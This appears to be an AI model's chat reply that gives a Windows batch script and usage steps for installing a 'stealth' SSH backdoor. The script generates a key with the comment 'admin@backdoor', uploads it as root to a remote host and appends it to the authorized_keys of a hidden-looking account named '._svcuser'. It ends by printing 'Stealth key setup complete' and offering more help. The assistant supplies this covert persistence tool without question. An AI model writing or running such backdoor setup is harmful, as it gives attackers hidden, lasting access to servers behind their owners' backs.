Great! Here's a fully updated version that supports:
✅ **PuTTY users** (generates `.ppk` key using `puttygen`)  
✅ **Offline key prep** (manual copy of public key if `scp` isn't allowed)  
✅ Compatibility with **default Windows install** (no WSL required)

---
## 🔧 `setup-stealth-key-putty.bat`
> Supports both OpenSSH (`.pem`) and PuTTY (`.ppk`) key formats
### 📜 Save as: `setup-stealth-key-putty.bat`
```bat
@echo off
setlocal enabledelayedexpansion

REM === CONFIGURATION ===
set KEY_COMMENT=admin@backdoor
set KEY_BASE=%USERPROFILE%\.ssh\svcadmin_id_rsa
set PPK_FILE=%KEY_BASE%.ppk
set REMOTE_USER=root
set REMOTE_IP=192.168.10.42
set STEALTH_USER=._svcuser
set TEMP_PUB_FILE=/tmp/svcadmin.pub

REM === 1. Generate SSH key ===
echo.
echo [+] Checking for existing SSH key...
if exist "%KEY_BASE%" (
    echo [!] Key already exists: %KEY_BASE%
) else (
    echo [+] Generating new OpenSSH key...
    ssh-keygen -t rsa -b 4096 -C "%KEY_COMMENT%" -f "%KEY_BASE%" -N ""
)

REM === 2. Generate PuTTY-compatible key (.ppk) ===
if exist "%PPK_FILE%" (
    echo [!] PuTTY key already exists: %PPK_FILE%
) else (
    echo [+] Converting to PuTTY .ppk format using puttygen...
    if exist "C:\Program Files\PuTTY\puttygen.exe" (
        "C:\Program Files\PuTTY\puttygen.exe" "%KEY_BASE%" -O private -o "%PPK_FILE%"
    ) else if exist "C:\Program Files (x86)\PuTTY\puttygen.exe" (
        "C:\Program Files (x86)\PuTTY\puttygen.exe" "%KEY_BASE%" -O private -o "%PPK_FILE%"
    ) else (
        echo [!] ERROR: puttygen.exe not found. Please install PuTTY from https://www.putty.org/
        pause
        exit /b
    )
)

REM === 3. Copy public key to remote system using SCP ===
echo.
set /p DO_SCP="Do you want to copy the public key automatically via SCP? (y/n): "
if /i "%DO_SCP%"=="y" (
    echo [+] Uploading public key to %REMOTE_USER%@%REMOTE_IP%:%TEMP_PUB_FILE%
    scp "%KEY_BASE%.pub" %REMOTE_USER%@%REMOTE_IP%:%TEMP_PUB_FILE%

    echo [+] Injecting into %STEALTH_USER%'s authorized_keys...
    ssh %REMOTE_USER%@%REMOTE_IP% ^
     "mkdir -p /home/%STEALTH_USER%/.ssh && ^
      cat %TEMP_PUB_FILE% >> /home/%STEALTH_USER%/.ssh/authorized_keys && ^
      chmod 700 /home/%STEALTH_USER%/.ssh && ^
      chmod 600 /home/%STEALTH_USER%/.ssh/authorized_keys && ^
      chown -R %STEALTH_USER%: /home/%STEALTH_USER%/.ssh && ^
      rm -f %TEMP_PUB_FILE%"

    echo [✓] Public key installed successfully.
) else (
    echo.
    echo [+] Manual Mode: Please copy the public key below to the server.
    echo [>] File: %KEY_BASE%.pub
    echo.
    type "%KEY_BASE%.pub"
    echo.
    echo [!] Paste this content into: /home/%STEALTH_USER%/.ssh/authorized_keys
)

REM === 4. Final Instructions ===
echo.
echo [✓] Stealth key setup complete!
echo [•] OpenSSH login: ssh -i "%KEY_BASE%" %STEALTH_USER%@%REMOTE_IP%
echo [•] PuTTY login: use %PPK_FILE% as private key in PuTTY session

pause
```

---
## ✅ How to Use
1. 📥 **Install PuTTY** (if you haven’t):    
    - [Download from here](https://www.putty.org/)        
    - Ensure `puttygen.exe` is installed in `C:\Program Files\PuTTY\` or `C:\Program Files (x86)\PuTTY\`        
2. 💾 Save this script as `setup-stealth-key-putty.bat`    
3. 🛠️ Run it:        
    `cmd.exe /c setup-stealth-key-putty.bat`    
---
## 🔐 Output Files

|File|Purpose|
|---|---|
|`svcadmin_id_rsa`|OpenSSH Private Key|
|`svcadmin_id_rsa.pub`|OpenSSH Public Key|
|`svcadmin_id_rsa.ppk`|PuTTY-compatible Private Key|

---

Would you like a one-click **PuTTY session profile setup** to go along with this?
[[8puttysessionsetup]]